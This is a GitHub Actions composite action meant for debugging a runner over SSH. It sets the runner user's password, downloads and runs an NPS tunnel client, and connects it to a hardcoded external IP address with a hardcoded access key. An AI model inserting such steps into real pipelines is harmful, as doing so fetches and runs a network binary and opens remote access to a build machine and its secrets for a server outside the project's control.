name: 'Debug via SSH test'
description: 'SSH to a GitHub Actions runner using NPC'
branding:
  icon: 'terminal'  
  color: 'green'
inputs:
  SSH_PASS:
    description: 'Password for SSH session'
    required: true
runs:
  using: "composite"
  steps:
    - name: Change the SSH user password
      run: |
          echo runner:"${{ inputs.SSH_PASS }}" |sudo chpasswd runner
          
    - name: Install and setup NPC
      run: |
        echo "# Install NPC"
        wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
        tar -zxvf linux_amd64_client.tar.gz
        rm linux_amd64_client.tar.gz
        sleep 1
        chmod +x npc

    - name: Start NPC
      run: |
        printf "# Starting NPC..."
          ./npc -server=150.230.12.211:8024 -vkey=3mh9rlvj7sgbmlhv -type=tcp &
          
